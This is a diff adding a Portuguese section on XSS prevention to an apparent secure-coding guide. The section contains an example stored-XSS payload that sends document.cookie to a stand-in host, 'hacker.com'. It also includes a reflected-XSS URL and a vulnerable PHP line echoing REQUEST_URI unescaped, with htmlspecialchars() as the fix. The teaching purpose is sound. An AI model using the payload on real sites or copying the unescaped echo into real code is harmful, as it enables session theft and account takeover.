@@ -36,6 +36,59 @@ Imagine o banco de dados como um robô que só entende a linguagem SQL. Se você
 
 Atacantes podem contornar o login, roubar todos os dados do banco (listas de usuários, hashes de senhas), ou até mesmo deletar o banco de dados.
 
+### 【Prevenir Ataques de Cross-Site Scripting (XSS)】
+
+**Por que é importante?**
+
+Se o seu site é como um espelho que reflete diretamente o conteúdo de entrada do usuário, então os usuários podem incorporar scripts JavaScript maliciosos no conteúdo. Quando outros usuários navegam por este conteúdo, o script malicioso será executado em seus navegadores, roubando suas informações. A codificação de entidades HTML converte caracteres especiais em scripts maliciosos (como `<`, `>`) em texto simples inofensivo, tornando-os não executáveis.
+
+**Cenário do Hacker 😈**
+> Deixei um comentário na seção de comentários do seu artigo: `<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>`. Este texto foi armazenado no banco de dados como está. Agora qualquer usuário que ler este comentário terá seu navegador executando automaticamente este script, enviando seus cookies de login para o meu servidor. Com os cookies, posso me passar por eles para fazer login no site.
+
+**Método de Ataque Avançado: Como o Código do Usuário A Pode Roubar os Dados do Usuário B?**
+
+Muitas pessoas se perguntam: "O atacante não modificou meu site, então como ele pode roubar os dados de outros usuários?" Deixe-me explicar com um exemplo completo:
+
+1. **O atacante A cria um link malicioso**
+   ```
+   https://yoursite.com/detail.php?id=1<script>steal()</script>
+   ```
+
+2. **O atacante engana a vítima B através de engenharia social**
+   - Email: "Veja o trabalho fantástico deste fotógrafo!"
+   - Posts em redes sociais, comentários em fóruns, etc.
+
+3. **O que acontece quando a vítima B clica no link?**
+   ```php
+   // Seu código (vulnerável)
+   <meta property="og:url" content="<?php echo $_SERVER['REQUEST_URI']; ?>">
+   
+   // Saída real para o navegador de B
+   <meta property="og:url" content="/detail.php?id=1<script>steal()</script>">
+   ```
+
+4. **Por que eles podem roubar os dados de B?**
+   - B já está autenticado no seu site
+   - O script malicioso executa sob **seu domínio**, então pode:
+     - Ler os cookies de B (credenciais de login)
+     - Acessar o localStorage de B
+     - Fazer solicitações em nome de B
+     - Modificar o conteúdo da página (ex: formulários de login falsos)
+
+**Analogia Simples**
+Imagine que seu site é um banco:
+- O atacante A coloca um "comprovante de saque falso" (script malicioso) no saguão do banco
+- O cliente B pensa que é legítimo e insere sua senha
+- A obtém a senha de B
+
+XSS permite que atacantes coloquem "comprovantes de saque falsos" (código malicioso) no seu "saguão do banco" (site).
+
+É por isso que você deve usar `htmlspecialchars()` - garante que toda entrada do usuário seja exibida como texto simples, não como código executável.
+
+**Consequências Catastróficas 💥**
+
+Roubo massivo de contas de usuário, vazamento de dados pessoais, sites infiltrados com conteúdo de phishing ou scripts de mineração.
+
 ---
 
 ## 🔐 Permissões e Autenticação
